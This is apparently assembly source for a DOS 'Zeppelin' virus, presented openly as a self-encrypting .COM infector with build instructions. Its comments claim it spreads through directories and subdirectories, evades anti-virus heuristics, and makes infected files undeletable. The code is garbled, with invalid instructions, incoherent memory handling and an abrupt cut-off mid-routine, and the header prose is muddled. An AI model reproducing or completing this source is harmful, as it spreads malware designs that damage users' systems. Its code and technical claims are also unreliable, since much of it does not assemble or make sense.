;**************************************************************************
;
;The Zeppelin Virus  September 25, 1993
;[MPC] Generated...
;Created by... pAgE
;As a TRiBuTe to John "back-beat" Bohnam, this "WEAK-DICK" Overwind.Com
;Employee and Member of The Weistein Cell ...JPG got "KILLED" by the "SMOE"
;(along with other(s) friend(s))s virus.
;
;This is a self-encrypting *.COM infector that infects files when they are
;runned or executed. It does not move its own code to infected files, but
;tack on some additional code so it can decrypt itself before executing the
;original host. This eliminates many anti-virus tricks that watch for
;direct appends like mine, since their standard heuristic scan should miss
;it as it checks for EXE/COM infection.
;
;It also infects all files in current directory and subdirectories. And,
;when an infected program has been run several times, it will change attributes
;of its target file so it cannot be deleted. This way, I hope you have fun
;with it until you do want it around anymore (as viruses SHOULD BE), but
;then there's nothing stopping you from removing about 40 lines of code!
;
;I recommend compiling this under Turbo Assembler v 4.0 (though tasm should work)
;because of its memory allocation routines which call int 7e.
;To the best o my knowledge, this virus is C+ free.
;
;Command: zepple.asm
;         tlink /t zepple.obj
;         exe2bin zepple.exe zepple.com
;
;Scan for me as [MPC]"Zeppelin" Virus - pAgE <mpc@psg.com> Sat Nov 27 09:00:00 EST 1993
;Code Is Not Sorted
;
;**************************************************************************

.model tiny                         ; Handy directive

code segment                        ; unnamed code segment
assume cs:code,ds:code             ; one segment for both code & data


org 100h                            ; leave room for PSP

start_here:

db '[Z]',0                          ; string for strings module!

main proc near                      ; name doesn't matter...

mov bp,offset main                  ; save BP location
jmp self_decrypt                    ; decrypt ourself then continue...

write_virus:                        ; write routine starts here

lea dx,[bp+virus_start-offset start_here]      ; DS:DX = begin of code
xor cx,cx                           ; cx=0
mov ax,es                       ; AX=ES=[Memory alloc'd to us]
add ax,16                     ; add one para page + carry
mul word ptr ds:[2ch]           ; DS:BX = MCB offset in MEM_HEADER
dec bx                      ; dec BX, adjust for next block entry
mov es,ax                       ; ES:0000 = segment of mem block below us
sub word ptr es:[bx],(finish - start_here)/16d   ; decrease size of current blcok
sub word ptr es:[bx-16],(finish - start_here)/16d    ; increase size previous block
push word ptr es:[b_1]               ; store for later
inc si                ; SI = current segment number
shl si,4            ; convert to paragraph address
lea di,[si,bp+offset start_here]     ; DI points to source, our beginning
pop es : cx                   ; restore segment & set dest
rep movsb                 ; ahem... copy over self into high memory
mov es,cs:[2ch]           ; reget ES
mov byte ptr es:[di-1],'.'        ; replace first 'Z' w/ '.'
ret                             ; return to caller

virus_start equ dollar - offset start_here          ; encrypt from here up to $ sign

call get_encrypt_value              ; pass inside []
lea si,[bp+dollar-1]                ;
mov di,si                           ; 
not_si_di_same_equ                  ; 
mov cx,(virus_start-dollar)         ; # of bytes to encrypt
call encrypt_byte                   ;

byte ptr [si-1]=26h                 ; fix-up ret now...
dword ptr b_1 dd ?                   ; segement value storage...

encrypt_byte:
; Routine Encrypts or Decrypts Bytes Depending On Call Parameters

cmp ch,cl           ; ch = counter... cl = 0 means decrypt, >0 encrypt
jz no_action        ; if zero, don't act

or cx,cx           ; see if we're supposed to encrypt
jnz go_encrypt       ; yes? then let's rock n roll..

go_decrypt:                                   ; function go_decrypt
neg byte